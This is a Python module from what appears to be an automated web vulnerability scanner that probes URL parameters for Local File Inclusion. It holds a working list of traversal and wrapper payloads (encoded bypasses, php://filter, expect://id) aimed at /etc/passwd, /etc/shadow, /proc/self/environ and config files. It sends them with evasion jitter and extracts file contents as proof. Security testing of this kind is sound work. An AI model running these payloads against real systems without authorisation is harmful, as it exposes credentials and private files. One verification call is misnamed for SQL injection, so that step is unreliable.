"""
modules/vulns/lfi.py — Local File Inclusion

Reads actual files from the server. Reports file content in proof.
Targets file/path/page/include/template parameters specifically.
"""
import asyncio
import base64
import logging
from urllib.parse import urlparse, parse_qs, urlencode
from core.finding import Finding
from core.http_client import make_client, PROBE_TIMEOUT
from core.evasion import maybe_jitter

logger = logging.getLogger(__name__)

LFI_PAYLOADS: list[tuple[str, str]] = [
    ("../../../etc/passwd",                                   "3-level traverse"),
    ("../../../../etc/passwd",                                "4-level traverse"),
    ("../../../../../etc/passwd",                             "5-level traverse"),
    ("../../../../../../etc/passwd",                          "6-level traverse"),
    ("....//....//....//etc/passwd",                          "dot-slash bypass"),
    ("..%2f..%2f..%2fetc%2fpasswd",                          "url encoded"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",             "full url encoded"),
    ("..%252f..%252f..%252fetc%252fpasswd",                  "double encoded"),
    ("php://filter/convert.base64-encode/resource=/etc/passwd", "php filter b64"),
    ("php://filter/read=string.rot13/resource=/etc/passwd",  "php filter rot13"),
    ("/etc/passwd",                                           "absolute path"),
    ("/etc/shadow",                                           "shadow file"),
    ("/etc/hosts",                                            "hosts file"),
    ("/proc/self/environ",                                    "proc environ"),
    ("/proc/version",                                         "proc version"),
    ("C:\\Windows\\win.ini",                                  "win.ini"),
    ("C:/Windows/win.ini",                                    "win.ini forward slash"),
    ("../../../../Windows/win.ini",                           "win.ini traverse"),
    ("C:/boot.ini",                                           "boot.ini"),
    ("../../../../boot.ini",                                  "boot.ini traverse"),
    ("C:\\Windows\\System32\\drivers\\etc\\hosts",           "win hosts"),
    ("/var/log/apache2/access.log",                          "apache log"),
    ("/var/log/nginx/access.log",                            "nginx log"),
    ("/var/www/html/config.php",                             "config php"),
    ("php://input",                                          "php input"),
    ("expect://id",                                          "expect wrapper"),
]

# Map content → (description, severity)
LFI_INDICATORS: dict[str, tuple[str, str]] = {
    "root:x:0:0":     ("Linux /etc/passwd — full user list exposed", "Critical"),
    "root:!:":        ("Linux /etc/shadow — password hashes exposed", "Critical"),
    "daemon:x:":      ("Linux /etc/passwd", "Critical"),
    "/bin/bash":      ("Linux /etc/passwd", "Critical"),
    "[boot loader]":  ("Windows boot.ini", "High"),
    "[fonts]":        ("Windows win.ini", "High"),
    "HTTP_USER_AGENT":("/proc/self/environ — env vars exposed", "Critical"),
    "Linux version":  ("/proc/version — kernel version exposed", "High"),
    "# localhost":    ("/etc/hosts", "Medium"),
    "DB_PASSWORD":    ("Config file with database credentials", "Critical"),
    "APP_KEY":        ("Laravel .env with application key", "Critical"),
    "SECRET_KEY":     ("Django config with secret key", "Critical"),
}

# Params most likely to be injectable for LFI
LFI_PARAM_NAMES = {
    "file", "page", "include", "path", "template", "doc", "document",
    "folder", "root", "dir", "pg", "style", "pdf", "f", "filepath",
    "filename", "load", "read", "show", "view", "content", "src",
    "source", "module", "conf", "layout", "p", "lang", "locale",
}


class Lfi:
    async def run(self, ctx: dict) -> list[Finding]:
        findings: list[Finding] = []
        endpoints = ctx.get("endpoints", [])
        limiter   = ctx["limiter"]
        verifier  = ctx.get("verifier")
        sem       = asyncio.Semaphore(8)
        seen: set[str] = set()

        async def probe_ep(ep: str):
            parsed = urlparse(ep)
            if not parsed.query:
                return
            # Also check PHP extensions
            is_php = parsed.path.endswith(".php")
            params = parse_qs(parsed.query)
            # Prioritise LFI-likely params
            lfi_params = [p for p in params if p.lower() in LFI_PARAM_NAMES]
            other_params = [p for p in params if p not in lfi_params]
            test_params = lfi_params + (other_params[:2] if is_php else [])

            for param in test_params[:3]:
                key = f"{parsed.netloc}{parsed.path}:{param}"
                if key in seen:
                    continue
                seen.add(key)
                f = await self._probe(ep, param, parsed, params, limiter, sem, verifier)
                if f:
                    findings.append(f)
                    break

        await asyncio.gather(*[probe_ep(ep) for ep in endpoints[:200]])
        logger.info(f"Lfi completed — {len(findings)} finding(s)")
        return findings

    async def _probe(self, url, param, parsed, params, limiter, sem, verifier) -> Finding | None:
        async with sem:
            # Baseline: check if param is even reflected or used
            try:
                baseline_p = dict(params)
                baseline_p[param] = ["nonexistent_file_zparty.txt"]
                baseline_url = parsed._replace(query=urlencode(baseline_p, doseq=True)).geturl()
                async with limiter.acquire():
                    async with make_client(timeout=PROBE_TIMEOUT) as c:
                        baseline_r = await c.get(baseline_url)
                baseline_text = baseline_r.text
            except Exception:
                return None

            for payload, label in LFI_PAYLOADS:
                p = dict(params)
                p[param] = [payload]
                probe_url = parsed._replace(query=urlencode(p, doseq=True)).geturl()
                try:
                    await maybe_jitter()
                    async with limiter.acquire():
                        async with make_client(timeout=PROBE_TIMEOUT) as c:
                            r = await c.get(probe_url)
                    body = r.text

                    # PHP base64 filter — decode and check
                    if "base64-encode" in payload and r.status_code == 200:
                        try:
                            decoded = base64.b64decode(body.strip()).decode(errors="replace")
                            body = decoded
                        except Exception:
                            pass

                    matched_indicator = None
                    matched_desc = None
                    matched_severity = "High"
                    for indicator, (desc, sev) in LFI_INDICATORS.items():
                        if indicator in body and indicator not in baseline_text:
                            matched_indicator = indicator
                            matched_desc = desc
                            matched_severity = sev
                            break

                    if matched_indicator:
                        # Extract file content snippet
                        idx = body.find(matched_indicator)
                        snippet = body[max(0, idx-10):idx+300].strip()

                        finding = Finding(
                            title=f"Local File Inclusion (LFI) in '{param}' — {matched_desc}",
                            severity=matched_severity,
                            description=(
                                f"Parameter '{param}' includes local files. "
                                f"Payload '{payload}' read server file: {matched_desc}"
                            ),
                            affected_url=probe_url,
                            proof=f"GET {probe_url}\nPayload: {payload}\nIndicator: {matched_indicator}\nContent:\n{snippet[:400]}",
                            remediation="Validate file paths strictly. Never use user input in file inclusion. Use a whitelist of allowed files.",
                            impact=5, likelihood=4, module="Lfi",
                            references=["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"],
                            cvss_score=9.1, cwe="CWE-22",
                        )
                        if verifier and verifier.available:
                            try:
                                conf, shot = await verifier.verify_sqli(probe_url)
                                if conf:
                                    finding.verified   = True
                                    finding.screenshot = shot
                                    finding.title     += " [VERIFIED]"
                            except Exception:
                                pass
                        return finding
                except Exception as e:
                    logger.debug(f"LFI probe {probe_url}: {e}")
        return None
